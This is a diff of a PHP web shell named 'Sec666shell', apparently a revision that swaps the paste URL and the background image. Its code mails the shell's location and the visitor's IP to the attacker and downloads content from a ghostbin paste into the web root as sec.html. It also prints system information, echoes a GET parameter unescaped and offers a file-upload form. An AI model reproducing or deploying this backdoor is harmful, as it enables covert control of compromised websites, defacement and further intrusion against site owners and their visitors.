@@ -6,7 +6,7 @@ $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ip = "akses : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
 mail($mailsec, "Sec666shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
-$text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
+$text3 = file_get_contents('https://ghostbin.co/paste/35jfh/raw');
 $op3=fopen($check3, 'w');
 fwrite($op3,$text3);
 fclose($op3);
@@ -33,7 +33,7 @@ color:red;
 background-color: #191919;
 }
 table{
-background-image:url(https://i.ibb.co/DLXyr8B/20200308-072032.jpg);
+background-image:url(https://i.ibb.co/7tbqwpr/20200308-075634.jpg);
 background-size:cover;
 background-position:center center;
 border: 2px dotted #191919;
@@ -82,8 +82,8 @@ echo '">'.$pat.'</a>/';
 }
 echo '</td></tr><tr><td>';
 echo '<font color="white">System : <font color="red">{ </font>' .php_uname(). '<font color="red"> }</font></font></td></tr>';
-echo'<tr><td><center><font color="white">{></font>'.$_GET['filesrc'].
-'<font color="white"><}</font></center></td></tr>';
+echo'<tr><td><center>' .$_GET['filesrc'].
+'</center></td></tr>';
 echo '<tr><td><center><form enctype="multipart/form-data" method="POST">
 <input type="file" name="file" />
 <input type="submit" value="upload" />
